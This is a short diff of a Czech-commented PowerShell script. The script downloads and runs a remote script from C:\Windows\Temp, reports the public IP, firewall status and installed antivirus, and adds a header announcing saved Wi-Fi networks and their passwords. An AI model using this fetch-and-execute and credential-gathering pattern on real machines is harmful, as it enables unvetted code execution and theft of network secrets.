@@ -7,6 +7,10 @@ $scriptPath = "C:\Windows\Temp\script.ps1"
 # Stažení skriptu
 Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
 
+Write-Host "Uložené Wi-Fi sítě a jejich hesla:"
+
+Write-Host "`n" # Prázdný řádek
+
 # Kontrola, zda byl skript úspěšně stažen
 if (Test-Path $scriptPath) {
     # Spuštění staženého skriptu
@@ -45,14 +49,15 @@ Write-Host "Veřejná IP adresa: $publicIP"
 
 Write-Host "`n" # Prázdný řádek
 
-# Zjištění názvu nainstalovaného antivirového programu
-$antivirusName = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
-Write-Host "Antivirus: $antivirusName"
-
 # Zjištění stavu firewallu
 $firewallStatus = Get-NetFirewallProfile | Format-Table Name, Enabled -AutoSize
 Write-Host "Stav firewallu:" $firewallStatus
 
 Write-Host "`n" # Prázdný řádek
 
+# Zjištění názvu nainstalovaného antivirového programu
+$antivirusName = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
+Write-Host "Antivirus: $antivirusName"
+
+Write-Host "`n" # Prázdný řádek
 
